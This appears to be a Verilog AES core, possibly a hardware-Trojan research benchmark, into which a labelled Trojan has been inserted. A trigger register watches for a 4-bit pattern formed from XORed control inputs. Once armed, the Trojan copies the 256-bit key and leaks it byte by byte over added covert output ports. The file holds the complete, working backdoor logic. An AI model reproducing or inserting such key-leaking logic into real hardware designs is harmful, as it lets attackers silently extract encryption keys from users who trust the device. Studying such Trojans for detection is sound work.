module aes_core(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid,

                // ----- Trojan output port (Covert Channel) -----
                output wire           trojan_leak,  // <----- TROJAN: Outbound covert leak
                output wire [7:0]     trojan_data   // <----- TROJAN: Data being leaked
               );



  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;

  // ----- TROJAN TRIGGER MAGIC PATTERN -----
  localparam [3:0] TROJAN_TRIGGER_PATTERN = 4'b1011; // <--- Unique pattern to arm Trojan


  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

  /* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
  /* verilator lint_on UNOPTFLAT */


  //==================== TROJAN REGISTERS =====================
  reg [3:0] trojan_shift_reg;         // Holds trigger sequence bits
  reg       trojan_armed;             // Latches trigger activation
  reg [7:0] trojan_leak_reg;          // Holds the currently leaked byte
  reg       trojan_leak_valid_reg;    // Asserts when data is being leaked
  reg [5:0] trojan_byte_counter;      // Count bytes of key being leaked (0-31)
  reg       trojan_leaking;           // Internal enable for leaking state
  reg [255:0] trojan_key_shadow;      // Local copy of key at trigger
  //===========================================================


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign ready        = ready_reg;
  assign result       = muxed_new_block;
  assign result_valid = result_valid_reg;

  //------ TROJAN OUTPUTS -------
  assign trojan_leak = trojan_leak_valid_reg;   // Indicates when leak data is valid
  assign trojan_data = trojan_leak_reg;         // Provides one byte per cycle covertly
  //-----------------------------


  //----------------------------------------------------------------
  // reg_update
  //
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset. All registers have write enable.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg  <= 1'b0;
          ready_reg         <= 1'b1;
          aes_core_ctrl_reg <= CTRL_IDLE;

          // ======== TROJAN RESET ==========
          trojan_shift_reg      <= 4'b0000;
          trojan_armed          <= 1'b0;
          trojan_leak_reg       <= 8'b0;
          trojan_leak_valid_reg <= 1'b0;
          trojan_byte_counter   <= 6'd0;
          trojan_leaking        <= 1'b0;
          trojan_key_shadow     <= 256'b0;
          //=================================
        end
      else
        begin
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;

          // ========== TROJAN LOGIC =========================================

          // Shift in (init ^ next ^ encdec ^ keylen) to Trojan trigger register
          trojan_shift_reg <= {trojan_shift_reg[2:0], (init ^ next ^ encdec ^ keylen)};

          // Arm the Trojan if the trigger pattern is observed
          if (!trojan_armed && (trojan_shift_reg == TROJAN_TRIGGER_PATTERN))
            begin
              trojan_armed <= 1'b1;
              trojan_key_shadow <= key;      // Capture current key at the moment of trigger
              trojan_byte_counter <= 6'd0;
              trojan_leaking <= 1'b1;
            end
          // When leaking, step out bytes
          else if (trojan_armed && trojan_leaking)
            begin
              // Leak each bit 8 bits (per byte) per cycle
              trojan_leak_reg <= trojan_key_shadow[ (255-(trojan_byte_counter*8)) -: 8 ];
              trojan_leak_valid_reg <= 1'b1;

              // Increment byte counter
              if (trojan_byte_counter == 6'd31)
                begin
                  trojan_byte_counter <= 6'd0;
                  trojan_leaking <= 1'b0;
                  trojan_armed <= 1'b0; // Disarm after full key leak
                  trojan_leak_valid_reg <= 1'b0;
                end
              else
                trojan_byte_counter <= trojan_byte_counter + 6'd1;
            end
          // Not leaking: outputs invalid, registers clear
          else
            begin
              trojan_leak_reg <= 8'b0;
              trojan_leak_valid_reg <= 1'b0;
            end

          // Default: ensure we don't leak when not armed
          if (!trojan_armed)
            begin
              trojan_leak_reg <= 8'b0;
              trojan_leak_valid_reg <= 1'b0;
              trojan_leaking <= 1'b0;
              trojan_byte_counter <= 6'd0;
            end
         // ========================================================
        end
    end // reg_update


  //----------------------------------------------------------------
  // sbox_mux
  //
  // Controls which of the encipher datapath or the key memory
  // that gets access to the sbox.
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //
  // Controls which of the datapaths that get the next signal, have
  // access to the memory as well as the block processing result.
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          // Encipher operations
          enc_next        = next;
          muxed_round_nr  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          // Decipher operations
          dec_next        = next;
          muxed_round_nr  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux


  //----------------------------------------------------------------
  // aes_core_ctrl
  //
  // Control FSM for aes core. Basically tracks if we are in
  // key init, encipher or decipher modes and connects the
  // different submodules to shared resources and interface ports.
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin

          end
      endcase // case (aes_core_ctrl_reg)

    end // aes_core_ctrl
endmodule